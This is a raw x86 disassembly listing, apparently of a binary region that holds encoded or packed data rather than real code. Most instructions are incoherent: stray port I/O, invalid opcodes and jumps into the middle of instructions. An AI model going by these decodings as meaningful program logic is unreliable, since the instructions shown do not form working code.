  406ac0:	2d e5 34 5e 9f       	sub    $0x9f5e34e5,%eax
  406ac5:	5f                   	pop    %edi
  406ac6:	88 e6                	mov    %ah,%dh
  406ac8:	9d                   	popf
  406ac9:	5f                   	pop    %edi
  406aca:	9f                   	lahf
  406acb:	e5 60                	in     $0x60,%eax
  406acd:	6f                   	outsl  %ds:(%esi),(%dx)
  406ace:	34 20                	xor    $0x20,%al
  406ad0:	24 20                	and    $0x20,%al
  406ad2:	af                   	scas   %es:(%edi),%eax
  406ad3:	e5 a6                	in     $0xa6,%eax
  406ad5:	5f                   	pop    %edi
  406ad6:	9f                   	lahf
  406ad7:	5f                   	pop    %edi
  406ad8:	2d e5 34 5e 9f       	sub    $0x9f5e34e5,%eax
  406add:	5f                   	pop    %edi
  406ade:	88 62 9d             	mov    %ah,-0x63(%edx)
  406ae1:	5f                   	pop    %edi
  406ae2:	9f                   	lahf
  406ae3:	eb e5                	jmp    0x406aca
  406ae5:	54                   	push   %esp
  406ae6:	88 46 80             	mov    %al,-0x80(%esi)
  406ae9:	5f                   	pop    %edi
  406aea:	9f                   	lahf
  406aeb:	eb 98                	jmp    0x406a85
  406aed:	af                   	scas   %es:(%edi),%eax
  406aee:	25 5f 1c 8d e7       	and    $0xe78d1c5f,%eax
  406af3:	93                   	xchg   %eax,%ebx
  406af4:	96                   	xchg   %eax,%esi
  406af5:	b3 2b                	mov    $0x2b,%bl
  406af7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406af8:	a8 b0                	test   $0xb0,%al
  406afa:	2d ed 08 5e 9f       	sub    $0x9f5e08ed,%eax
  406aff:	5f                   	pop    %edi
  406b00:	2b 36                	sub    (%esi),%esi
  406b02:	2b a5 94 48 b7 42    	sub    0x42b74894(%ebp),%esp
  406b08:	9f                   	lahf
  406b09:	5f                   	pop    %edi
  406b0a:	2b e5                	sub    %ebp,%esp
  406b0c:	08 5e 9f             	or     %bl,-0x61(%esi)
  406b0f:	5f                   	pop    %edi
  406b10:	2b ad 98 eb f5 5c    	sub    0x5cf5eb98(%ebp),%ebp
  406b16:	88 ba 9d 5f 9f a6    	mov    %bh,-0x5960a063(%edx)
  406b1c:	ef                   	out    %eax,(%dx)
  406b1d:	d5 76                	aad    $0x76
  406b1f:	93                   	xchg   %eax,%ebx
  406b20:	60                   	pusha
  406b21:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  406b26:	b0 c8                	mov    $0xc8,%al
  406b28:	5b                   	pop    %ebx
  406b29:	b6 e0                	mov    $0xe0,%dh
  406b2b:	60                   	pusha
  406b2c:	2b a5 94 48 a5 26    	sub    0x26a54894(%ebp),%esp
  406b32:	9f                   	lahf
  406b33:	5f                   	pop    %edi
  406b34:	2b a5 90 48 9d 25    	sub    0x259d4890(%ebp),%esp
  406b3a:	9f                   	lahf
  406b3b:	5f                   	pop    %edi
  406b3c:	63 49 1b             	arpl   %ecx,0x1b(%ecx)
  406b3f:	29 9f 5f 8b 48 d3    	sub    %ebx,-0x2cb774a1(%edi)
  406b45:	20 fa                	and    %bh,%dl
  406b47:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406b4c:	08 59 f6             	or     %bl,-0xa(%ecx)
  406b4f:	a0 a0 ed 25 c8       	mov    0xc825eda0,%al
  406b54:	9e                   	sahf
  406b55:	5f                   	pop    %edi
  406b56:	9f                   	lahf
  406b57:	1a ab 60 a0 60 88    	sbb    -0x779f5fa0(%ebx),%ch
  406b5d:	9c                   	pushf
  406b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  406b5f:	5f                   	pop    %edi
  406b60:	9f                   	lahf
  406b61:	ed                   	in     (%dx),%eax
  406b62:	25 f4 9e 5f 9f       	and    $0x9f5f9ef4,%eax
  406b67:	eb b5                	jmp    0x406b1e
  406b69:	5c                   	pop    %esp
  406b6a:	ee                   	out    %al,(%dx)
  406b6b:	a0 a0 48 b7 34       	mov    0x34b748a0,%al
  406b70:	9f                   	lahf
  406b71:	5f                   	pop    %edi
  406b72:	2d a5 8c 48 9f       	sub    $0x9f488ca5,%eax
  406b77:	2d 9f 5f 63 49       	sub    $0x49635f9f,%eax
  406b7c:	dd 29                	(bad) (%ecx)
  406b7e:	9f                   	lahf
  406b7f:	5f                   	pop    %edi
  406b80:	8b 2f                	mov    (%edi),%ebp
  406b82:	ff                   	(bad)
  406b83:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  406b88:	62 68 a0             	bound  %ebp,-0x60(%eax)
  406b8b:	60                   	pusha
  406b8c:	a0 61 a0 60 a0       	mov    0xa060a061,%al
  406b91:	5f                   	pop    %edi
  406b92:	9f                   	lahf
  406b93:	5f                   	pop    %edi
  406b94:	9f                   	lahf
  406b95:	62 a0 60 a0 6d aa    	bound  %esp,-0x55925fa0(%eax)
  406b9b:	60                   	pusha
  406b9c:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  406ba1:	61                   	popa
  406ba2:	a0 60 a0 9b a0       	mov    0xa09ba060,%al
  406ba7:	60                   	pusha
  406ba8:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  406bad:	75 a0                	jne    0x406b4f
  406baf:	60                   	pusha
  406bb0:	a0 97 ed d7 14       	mov    0x14d7ed97,%al
  406bb5:	d8 f1                	fdiv   %st(1),%st
  406bb7:	b1 cf                	mov    $0xcf,%cl
  406bb9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406bba:	e5 d5                	in     $0xd5,%eax
  406bbc:	ee                   	out    %al,(%dx)
  406bbd:	98                   	cwtl
  406bbe:	f7 c4 f1 a6 0e 97    	test   $0x970ea6f1,%esp
  406bc4:	f8                   	clc
  406bc5:	b0 a0                	mov    $0xa0,%al
  406bc7:	60                   	pusha
  406bc8:	a0 b5 2b 4c f1       	mov    0xf14c2bb5,%al
  406bcd:	b3 f6                	mov    $0xf6,%bl
  406bcf:	b7 2b                	mov    $0x2b,%bh
  406bd1:	59                   	pop    %ecx
  406bd2:	2b 52 2b             	sub    0x2b(%edx),%edx
  406bd5:	38 52 61             	cmp    %dl,0x61(%edx)
  406bd8:	41                   	inc    %ecx
  406bd9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406bda:	d5 a0                	aad    $0xa0
  406bdc:	a0 48 f3 3e 9f       	mov    0x9f3ef348,%al
  406be1:	5f                   	pop    %edi
  406be2:	29 a5 9c ea e5 68    	sub    %esp,0x68e5ea9c(%ebp)
  406be8:	f0 ed                	lock in (%dx),%eax
  406bea:	e5 5c                	in     $0x5c,%eax
  406bec:	f0 eb 6f             	lock jmp 0x406c5e
  406bef:	eb 76                	jmp    0x406c67
  406bf1:	eb 63                	jmp    0x406c56
  406bf3:	48                   	dec    %eax
  406bf4:	1d 5c 9f 5f 2b       	sbb    $0x2b5f9f5c,%eax
  406bf9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406bfa:	9c                   	pushf
  406bfb:	bf fe bb f9 bd       	mov    $0xbdf9bbfe,%edi
  406c00:	62 64 a0 eb          	bound  %esp,-0x15(%eax,%eiz,4)
  406c04:	60                   	pusha
  406c05:	b5 2b                	mov    $0x2b,%ch
  406c07:	4c                   	dec    %esp
  406c08:	21 24 50             	and    %esp,(%eax,%edx,2)
  406c0b:	5e                   	pop    %esi
  406c0c:	9f                   	lahf
  406c0d:	5f                   	pop    %edi
  406c0e:	f3 b6 f7             	repz mov $0xf7,%dh
  406c11:	e9 f5 5c 2b 38       	jmp    0x386bc90b
  406c16:	2b a5 9c 48 fb 2d    	sub    0x2dfb489c(%ebp),%esp
  406c1c:	9f                   	lahf
  406c1d:	5f                   	pop    %edi
  406c1e:	2b 23                	sub    (%ebx),%esp
  406c20:	88 50 98             	mov    %dl,-0x68(%eax)
  406c23:	5f                   	pop    %edi
  406c24:	9f                   	lahf
  406c25:	e4 60                	in     $0x60,%al
  406c27:	6f                   	outsl  %ds:(%esi),(%dx)
  406c28:	24 f3                	and    $0xf3,%al
  406c2a:	a0 60 a0 93 60       	mov    0x6093a060,%al
  406c2f:	b5 08                	mov    $0x8,%ch
  406c31:	85 f8                	test   %edi,%eax
  406c33:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  406c38:	04 e9                	add    $0xe9,%al
  406c3a:	c0 eb 73             	shr    $0x73,%bl
  406c3d:	ed                   	in     (%dx),%eax
  406c3e:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406c43:	48                   	dec    %eax
  406c44:	b9 20 9f 5f 41       	mov    $0x415f9f20,%ecx
  406c49:	a0 48 a0 a0 26       	mov    0x26a0a048,%al
  406c4e:	a0 60 5a 61 a0       	mov    0xa0615a60,%al
  406c53:	60                   	pusha
  406c54:	a0 ed 25 10 9e       	mov    0x9e1025ed,%al
  406c59:	5f                   	pop    %edi
  406c5a:	9f                   	lahf
  406c5b:	48                   	dec    %eax
  406c5c:	09 23                	or     %esp,(%ebx)
  406c5e:	9f                   	lahf
  406c5f:	5f                   	pop    %edi
  406c60:	2d e5 50 5e 9f       	sub    $0x9f5e50e5,%eax
  406c65:	5f                   	pop    %edi
  406c66:	88 2e                	mov    %ch,(%esi)
  406c68:	61                   	popa
  406c69:	5f                   	pop    %edi
  406c6a:	9f                   	lahf
  406c6b:	eb 70                	jmp    0x406cdd
  406c6d:	eb e5                	jmp    0x406c54
  406c6f:	5c                   	pop    %esp
  406c70:	88 08                	mov    %cl,(%eax)
  406c72:	71 5f                	jno    0x406cd3
  406c74:	9f                   	lahf
  406c75:	ca a0 ed             	lret   $0xeda0
  406c78:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406c7d:	48                   	dec    %eax
  406c7e:	57                   	push   %edi
  406c7f:	21 9f 5f f0 eb e5    	and    %ebx,-0x1a140fa1(%edi)
  406c85:	5c                   	pop    %esp
  406c86:	88 1a                	mov    %bl,(%edx)
  406c88:	70 5f                	jo     0x406ce9
  406c8a:	9f                   	lahf
  406c8b:	eb 70                	jmp    0x406cfd
  406c8d:	ed                   	in     (%dx),%eax
  406c8e:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406c93:	b9 88 2c 60 5f       	mov    $0x5f602c88,%ecx
  406c98:	9f                   	lahf
  406c99:	ed                   	in     (%dx),%eax
  406c9a:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406c9f:	48                   	dec    %eax
  406ca0:	a1 21 9f 5f d3       	mov    0xd35f9f21,%eax
  406ca5:	20 fa                	and    %bh,%dl
  406ca7:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406cac:	8b 72 89             	mov    -0x77(%edx),%esi
  406caf:	3e 66 5f             	ds pop %di
  406cb2:	9f                   	lahf
  406cb3:	eb e5                	jmp    0x406c9a
  406cb5:	5c                   	pop    %esp
  406cb6:	88 1e                	mov    %bl,(%esi)
  406cb8:	6c                   	insb   (%dx),%es:(%edi)
  406cb9:	5f                   	pop    %edi
  406cba:	9f                   	lahf
  406cbb:	48                   	dec    %eax
  406cbc:	29 28                	sub    %ebp,(%eax)
  406cbe:	9f                   	lahf
  406cbf:	5f                   	pop    %edi
  406cc0:	ff                   	(bad)
  406cc1:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  406cc6:	63 eb                	arpl   %ebp,%ebx
  406cc8:	60                   	pusha
  406cc9:	b5 2b                	mov    $0x2b,%ch
  406ccb:	4c                   	dec    %esp
  406ccc:	21 24 50             	and    %esp,(%eax,%edx,2)
  406ccf:	5e                   	pop    %esi
  406cd0:	9f                   	lahf
  406cd1:	5f                   	pop    %edi
  406cd2:	f3 b6 f7             	repz mov $0xf7,%dh
  406cd5:	eb fd                	jmp    0x406cd4
  406cd7:	68 66 a5 9f 60       	push   $0x609fa566
  406cdc:	d3 20                	shll   %cl,(%eax)
  406cde:	f5                   	cmc
  406cdf:	c8 57 b8 e0          	enter  $0xb857,$0xe0
  406ce3:	60                   	pusha
  406ce4:	04 5f                	add    $0x5f,%al
  406ce6:	d0 c4                	rol    $1,%ah
  406ce8:	29 80 2b b5 ac ed    	sub    %eax,-0x12534ad5(%eax)
  406cee:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406cf3:	48                   	dec    %eax
  406cf4:	09 1f                	or     %ebx,(%edi)
  406cf6:	9f                   	lahf
  406cf7:	5f                   	pop    %edi
  406cf8:	5a                   	pop    %edx
  406cf9:	61                   	popa
  406cfa:	a0 60 a0 ed 25       	mov    0x25eda060,%al
  406cff:	10 9e 5f 9f 48 7d    	adc    %bl,0x7d489f5f(%esi)
  406d05:	22 9f 5f 0a 60 2b    	and    0x2b600a5f(%edi),%bl
  406d0b:	23 88 48 6d 5f 9f    	and    -0x60a092b8(%eax),%ecx
  406d11:	b0 2b                	mov    $0x2b,%al
  406d13:	23 88 38 6f 5f 9f    	and    -0x60a090c8(%eax),%ecx
  406d19:	eb 70                	jmp    0x406d8b
  406d1b:	ed                   	in     (%dx),%eax
  406d1c:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406d21:	b9 88 be 60 5f       	mov    $0x5f60be88,%ecx
  406d26:	9f                   	lahf
  406d27:	ed                   	in     (%dx),%eax
  406d28:	25 10 9e 5f 9f       	and    $0x9f5f9e10,%eax
  406d2d:	48                   	dec    %eax
  406d2e:	13 20                	adc    (%eax),%esp
  406d30:	9f                   	lahf
  406d31:	5f                   	pop    %edi
  406d32:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  406d34:	9f                   	lahf
  406d35:	61                   	popa
  406d36:	d3 20                	shll   %cl,(%eax)
  406d38:	fa                   	cli
  406d39:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406d3e:	8b 6a 89             	mov    -0x77(%edx),%ebp
  406d41:	ac                   	lods   %ds:(%esi),%al
  406d42:	66 5f                	pop    %di
  406d44:	9f                   	lahf
  406d45:	48                   	dec    %eax
  406d46:	9f                   	lahf
  406d47:	27                   	daa
  406d48:	9f                   	lahf
  406d49:	5f                   	pop    %edi
  406d4a:	2a a5 9f bf fe bb    	sub    -0x44014061(%ebp),%ah
  406d50:	2b 45 fd             	sub    -0x3(%ebp),%eax
  406d53:	22 a8 60 2d a0 a0    	and    -0x5f5fd2a0(%eax),%ch
  406d59:	b5 2b                	mov    $0x2b,%ch
  406d5b:	4c                   	dec    %esp
  406d5c:	d3 20                	shll   %cl,(%eax)
  406d5e:	f5                   	cmc
  406d5f:	c8 95 b8 e0          	enter  $0xb895,$0xe0
  406d63:	60                   	pusha
  406d64:	04 5f                	add    $0x5f,%al
  406d66:	d0 c4                	rol    $1,%ah
  406d68:	29 80 9f 65 34 16    	sub    %eax,0x1634659f(%eax)
  406d6e:	e0 60                	loopne 0x406dd0
  406d70:	d3 20                	shll   %cl,(%eax)
  406d72:	fa                   	cli
  406d73:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406d78:	08 5c f8 a0          	or     %bl,-0x60(%eax,%edi,8)
  406d7c:	a0 23 89 9a 67       	mov    0x679a8923,%al
  406d81:	5f                   	pop    %edi
  406d82:	9f                   	lahf
  406d83:	4b                   	dec    %ebx
  406d84:	98                   	cwtl
  406d85:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  406d8a:	cd f4                	int    $0xf4
  406d8c:	56                   	push   %esi
  406d8d:	a0 a0 61 63 5f       	mov    0x5f6361a0,%al
  406d92:	c5 38                	lds    (%eax),%edi
  406d94:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  406d9a:	c5 34 d1             	lds    (%ecx,%edx,8),%esi
  406d9d:	a1 a0 eb 60 b5       	mov    0xb560eba0,%eax
  406da2:	2b 4c d3 20          	sub    0x20(%ebx,%edx,8),%ecx
  406da6:	f5                   	cmc
  406da7:	c8 dd b9 e0          	enter  $0xb9dd,$0xe0
  406dab:	60                   	pusha
  406dac:	04 5f                	add    $0x5f,%al
  406dae:	d0 c4                	rol    $1,%ah
  406db0:	29 80 9f 65 38 16    	sub    %eax,0x1638659f(%eax)
  406db6:	e0 60                	loopne 0x406e18
  406db8:	d3 20                	shll   %cl,(%eax)
  406dba:	fa                   	cli
  406dbb:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406dc0:	08 a4 f9 a0 a0 23 89 	or     %ah,-0x76dc5f60(%ecx,%edi,8)
  406dc7:	52                   	push   %edx
  406dc8:	66 5f                	pop    %di
  406dca:	9f                   	lahf
  406dcb:	4b                   	dec    %ebx
  406dcc:	98                   	cwtl
  406dcd:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  406dd2:	cd f8                	int    $0xf8
  406dd4:	56                   	push   %esi
  406dd5:	a0 a0 61 63 5f       	mov    0x5f6361a0,%al
  406dda:	c5 4c d1 a1          	lds    -0x5f(%ecx,%edx,8),%ecx
  406dde:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  406de3:	48                   	dec    %eax
  406de4:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  406dea:	c5 44 d1 a1          	lds    -0x5f(%ecx,%edx,8),%eax
  406dee:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  406df3:	40                   	inc    %eax
  406df4:	d1 a1 a0 eb 60 b5    	shll   $1,-0x4a9f1460(%ecx)
  406dfa:	2b 4c d3 20          	sub    0x20(%ebx,%edx,8),%ecx
  406dfe:	f5                   	cmc
  406dff:	c8 35 b9 e0          	enter  $0xb935,$0xe0
  406e03:	60                   	pusha
  406e04:	04 5f                	add    $0x5f,%al
  406e06:	d0 c4                	rol    $1,%ah
  406e08:	29 80 9f 65 3c 16    	sub    %eax,0x163c659f(%eax)
  406e0e:	e0 60                	loopne 0x406e70
  406e10:	d3 20                	shll   %cl,(%eax)
  406e12:	fa                   	cli
  406e13:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406e18:	08 fc                	or     %bh,%ah
  406e1a:	f9                   	stc
  406e1b:	a0 a0 23 89 fa       	mov    0xfa8923a0,%al
  406e20:	66 5f                	pop    %di
  406e22:	9f                   	lahf
  406e23:	4b                   	dec    %ebx
  406e24:	98                   	cwtl
  406e25:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  406e2a:	cd fc                	int    $0xfc
  406e2c:	56                   	push   %esi
  406e2d:	a0 a0 61 63 85       	mov    0x856361a0,%al
  406e32:	9f                   	lahf
  406e33:	60                   	pusha
  406e34:	a0 60 21 42 9f       	mov    0x9f422160,%al
  406e39:	60                   	pusha
  406e3a:	a0 60 61 42 a8       	mov    0xa8426160,%al
  406e3f:	c6                   	(bad)
  406e40:	ab                   	stos   %eax,%es:(%edi)
  406e41:	22 63 eb             	and    -0x15(%ebx),%ah
  406e44:	60                   	pusha
  406e45:	b5 2b                	mov    $0x2b,%ch
  406e47:	4c                   	dec    %esp
  406e48:	21 24 f8             	and    %esp,(%eax,%edi,8)
  406e4b:	5e                   	pop    %esi
  406e4c:	9f                   	lahf
  406e4d:	5f                   	pop    %edi
  406e4e:	f3 b6 f7             	repz mov $0xf7,%dh
  406e51:	93                   	xchg   %eax,%ebx
  406e52:	69 e9 2d c4 9e 5f    	imul   $0x5f9ec42d,%ecx,%ebp
  406e58:	9f                   	lahf
  406e59:	e9 2d c0 9e 5f       	jmp    0x5fdf2e8b
  406e5e:	9f                   	lahf
  406e5f:	e9 2d bc 9e 5f       	jmp    0x5fdf2a91
  406e64:	9f                   	lahf
  406e65:	e9 2d b8 9e 5f       	jmp    0x5fdf2697
  406e6a:	9f                   	lahf
  406e6b:	e9 2d c8 9e 5f       	jmp    0x5fdf369d
  406e70:	9f                   	lahf
  406e71:	e9 ed 5c 2b 52       	jmp    0x526bcb63
  406e76:	2b 38                	sub    (%eax),%edi
  406e78:	d3 20                	shll   %cl,(%eax)
  406e7a:	f5                   	cmc
  406e7b:	c8 c2 bb e0          	enter  $0xbbc2,$0xe0
  406e7f:	60                   	pusha
  406e80:	04 5f                	add    $0x5f,%al
  406e82:	d0 c4                	rol    $1,%ah
  406e84:	29 80 2b 26 88 4c    	sub    %eax,0x4c88262b(%eax)
  406e8a:	6a 5f                	push   $0x5f
  406e8c:	9f                   	lahf
  406e8d:	93                   	xchg   %eax,%ebx
  406e8e:	60                   	pusha
  406e8f:	b5 08                	mov    $0x8,%ch
  406e91:	52                   	push   %edx
  406e92:	fa                   	cli
  406e93:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  406e98:	04 e9                	add    $0xe9,%al
  406e9a:	c0 ed 25             	shr    $0x25,%ch
  406e9d:	cc                   	int3
  406e9e:	9e                   	sahf
  406e9f:	5f                   	pop    %edi
  406ea0:	9f                   	lahf
  406ea1:	b0 52                	mov    $0x52,%al
  406ea3:	62 50 62             	bound  %edx,0x62(%eax)
  406ea6:	88 e6                	mov    %ah,%dh
  406ea8:	9f                   	lahf
  406ea9:	5f                   	pop    %edi
  406eaa:	9f                   	lahf
  406eab:	b0 88                	mov    $0x88,%al
  406ead:	48                   	dec    %eax
  406eae:	9e                   	sahf
  406eaf:	5f                   	pop    %edi
  406eb0:	9f                   	lahf
  406eb1:	eb 63                	jmp    0x406f16
  406eb3:	48                   	dec    %eax
  406eb4:	d9 2e                	fldcw  (%esi)
  406eb6:	9f                   	lahf
  406eb7:	5f                   	pop    %edi
  406eb8:	f0 48                	lock dec %eax
  406eba:	73 5e                	jae    0x406f1a
  406ebc:	9f                   	lahf
  406ebd:	5f                   	pop    %edi
  406ebe:	2b 38                	sub    (%eax),%edi
  406ec0:	25 3b 15 6d d3       	and    $0xd36d153b,%eax
  406ec5:	20 fa                	and    %bh,%dl
  406ec7:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  406ecc:	89 14 a0             	mov    %edx,(%eax,%eiz,4)
  406ecf:	60                   	pusha
  406ed0:	a0 ed e5 5c f0       	mov    0xf05ce5ed,%al
  406ed5:	ed                   	in     (%dx),%eax
  406ed6:	25 c8 9e 5f 9f       	and    $0x9f5f9ec8,%eax
  406edb:	eb f3                	jmp    0x406ed0
  406edd:	6c                   	insb   (%dx),%es:(%edi)
  406ede:	2b 72 88             	sub    -0x78(%edx),%esi
  406ee1:	20 6b 5f             	and    %ch,0x5f(%ebx)
  406ee4:	9f                   	lahf
  406ee5:	eb 25                	jmp    0x406f0c
  406ee7:	c8 9e 5f 9f          	enter  $0x5f9e,$0x9f
  406eeb:	19 a4 60 a0 60 d3 32 	sbb    %esp,0x32d360a0(%eax,%eiz,2)
  406ef2:	88 b6 6e 5f 9f ed    	mov    %dh,-0x1260a092(%esi)
  406ef8:	35 c4 9e 5f 9f       	xor    $0x9f5f9ec4,%eax
  406efd:	eb e5                	jmp    0x406ee4
  406eff:	5c                   	pop    %esp
  406f00:	af                   	scas   %es:(%edi),%eax
  406f01:	16                   	push   %ss
  406f02:	a0 48 89 43 9f       	mov    0x9f438948,%al
  406f07:	5f                   	pop    %edi
  406f08:	9f                   	lahf
  406f09:	15 04 5e 9f 5f       	adc    $0x5f9f5e04,%eax
  406f0e:	08 98 fb a0 a0 ed    	or     %bl,-0x125f5f05(%eax)
  406f14:	35 c0 9e 5f 9f       	xor    $0x9f5f9ec0,%eax
  406f19:	eb e5                	jmp    0x406f00
  406f1b:	5c                   	pop    %esp
  406f1c:	af                   	scas   %es:(%edi),%eax
  406f1d:	16                   	push   %ss
  406f1e:	e0 61                	loopne 0x406f81
  406f20:	88 2c 83             	mov    %ch,(%ebx,%eax,4)
  406f23:	5f                   	pop    %edi
  406f24:	9f                   	lahf
  406f25:	5f                   	pop    %edi
  406f26:	55                   	push   %ebp
  406f27:	c0 9e 5f 9f c8 d8 bb 	rcrb   $0xbb,-0x273760a1(%esi)
  406f2e:	e0 60                	loopne 0x406f90
  406f30:	2d f5 fc 5e 9f       	sub    $0x9f5efcf5,%eax
  406f35:	5f                   	pop    %edi
  406f36:	2b a5 9c 6f 56 a0    	sub    -0x5fa99064(%ebp),%esp
  406f3c:	a2 48 4f 43 9f       	mov    %al,0x9f434f48
  406f41:	5f                   	pop    %edi
  406f42:	9f                   	lahf
  406f43:	15 fc 5e 9f 5f       	adc    $0x5f9f5efc,%eax
  406f48:	08 98 fb a0 a0 ed    	or     %bl,-0x125f5f05(%eax)
  406f4e:	35 b8 9e 5f 9f       	xor    $0x9f5f9eb8,%eax
  406f53:	eb e5                	jmp    0x406f3a
  406f55:	5c                   	pop    %esp
  406f56:	af                   	scas   %es:(%edi),%eax
  406f57:	16                   	push   %ss
  406f58:	e0 63                	loopne 0x406fbd
  406f5a:	88 f2                	mov    %dh,%dl
  406f5c:	83 5f 9f 5f          	sbbl   $0x5f,-0x61(%edi)
  406f60:	55                   	push   %ebp
  406f61:	b8 9e 5f 9f eb       	mov    $0xeb9f5f9e,%eax
  406f66:	66 1a a7 60 a0 60 88 	data16 sbb -0x779f5fa0(%edi),%ah
  406f6d:	a8 6c                	test   $0x6c,%al
  406f6f:	5f                   	pop    %edi
  406f70:	9f                   	lahf
  406f71:	93                   	xchg   %eax,%ebx
  406f72:	60                   	pusha
  406f73:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  406f78:	b0 4b                	mov    $0x4b,%al
  406f7a:	aa                   	stos   %al,%es:(%edi)
  406f7b:	49                   	dec    %ecx
  406f7c:	b1 24                	mov    $0x24,%cl
  406f7e:	9f                   	lahf
  406f7f:	5f                   	pop    %edi
  406f80:	88 24 65 5f 9f 93 60 	mov    %ah,0x60939f5f(,%eiz,2)
  406f87:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  406f8c:	b0 c8                	mov    $0xc8,%al
  406f8e:	c9                   	leave
  406f8f:	bb e0 60 2d e5       	mov    $0xe52d60e0,%ebx
  406f94:	f8                   	clc
  406f95:	5e                   	pop    %esi
  406f96:	9f                   	lahf
  406f97:	5f                   	pop    %edi
  406f98:	5a                   	pop    %edx
  406f99:	65 a0 60 a0 48 9b    	mov    %gs:0x9b48a060,%al
  406f9f:	29 9f 5f 2d a5 9c    	sub    %ebx,-0x635ad2a1(%edi)
  406fa5:	48                   	dec    %eax
  406fa6:	6f                   	outsl  %ds:(%esi),(%dx)
  406fa7:	29 9f 5f 63 49 ad    	sub    %ebx,-0x52b69ca1(%edi)
  406fad:	25 9f 5f 8b 40       	and    $0x408b5f9f,%eax
  406fb2:	ff                   	(bad)
  406fb3:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  406fb8:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  406fbb:	5f                   	pop    %edi
  406fbc:	9f                   	lahf
  406fbd:	61                   	popa
  406fbe:	a0 60 a0 8e a0       	mov    0xa08ea060,%al
  406fc3:	60                   	pusha
  406fc4:	a0 b5 2b 4c 0a       	mov    0xa4c2bb5,%al
  406fc9:	60                   	pusha
  406fca:	0a 60 0a             	or     0xa(%eax),%ah
  406fcd:	60                   	pusha
  406fce:	0a 60 0a             	or     0xa(%eax),%ah
  406fd1:	60                   	pusha
  406fd2:	0a 60 f3             	or     -0xd(%eax),%ah
  406fd5:	b6 f7                	mov    $0xf7,%dh
  406fd7:	e9 ed 5c 2b 3a       	jmp    0x3a6bccc9
  406fdc:	2b 50 d3             	sub    -0x2d(%eax),%edx
  406fdf:	20 f5                	and    %dh,%ch
  406fe1:	c8 5c bc e0          	enter  $0xbc5c,$0xe0
  406fe5:	60                   	pusha
  406fe6:	04 5f                	add    $0x5f,%al
  406fe8:	d0 c4                	rol    $1,%ah
  406fea:	29 80 2b a5 9c 48    	sub    %eax,0x489ca52b(%eax)
  406ff0:	25 29 9f 5f d3       	and    $0xd35f9f29,%eax
  406ff5:	20 f5                	and    %dh,%ch
  406ff7:	c8 2f bc e0          	enter  $0xbc2f,$0xe0
  406ffb:	60                   	pusha
  406ffc:	04 5f                	add    $0x5f,%al
  406ffe:	d0 c4                	rol    $1,%ah
  407000:	29 80 08 60 a0 60    	sub    %eax,0x60a06008(%eax)
  407006:	a2 ca a0 ca a0       	mov    %al,0xa0caa0ca
  40700b:	ca a0 c8             	lret   $0xc8a0
  40700e:	6c                   	insb   (%dx),%es:(%edi)
  40700f:	bc e0 60 88 2a       	mov    $0x2a8860e0,%esp
  407014:	9d                   	popf
  407015:	5f                   	pop    %edi
  407016:	9f                   	lahf
  407017:	eb 98                	jmp    0x406fb1
  407019:	e5 9f                	in     $0x9f,%eax
  40701b:	d5 ad                	aad    $0xad
  40701d:	93                   	xchg   %eax,%ebx
  40701e:	60                   	pusha
  40701f:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  407024:	b0 49                	mov    $0x49,%al
  407026:	98                   	cwtl
  407027:	60                   	pusha
  407028:	a0 60 25 3b 14       	mov    0x143b2560,%al
  40702d:	7e 2d                	jle    0x40705c
  40702f:	ad                   	lods   %ds:(%esi),%eax
  407030:	88 93 72 18 78 bc    	mov    %dl,-0x4387e78e(%ebx)
  407036:	e0 60                	loopne 0x407098
  407038:	88 28                	mov    %ch,(%eax)
  40703a:	8b 5f 9f             	mov    -0x61(%edi),%ebx
  40703d:	eb f5                	jmp    0x407034
  40703f:	48                   	dec    %eax
  407040:	2d a5 90 eb 6b       	sub    $0x6beb90a5,%eax
  407045:	48                   	dec    %eax
  407046:	9b                   	fwait
  407047:	2a 9f 5f 8b 68 2d    	sub    0x2d688b5f(%edi),%bl
  40704d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40704e:	90                   	nop
  40704f:	48                   	dec    %eax
  407050:	c5 29                	lds    (%ecx),%ebp
  407052:	9f                   	lahf
  407053:	5f                   	pop    %edi
  407054:	0a 60 08             	or     0x8(%eax),%ah
  407057:	60                   	pusha
  407058:	a0 60 c2 eb e5       	mov    0xe5ebc260,%al
  40705d:	50                   	push   %eax
  40705e:	88 f6                	mov    %dh,%dh
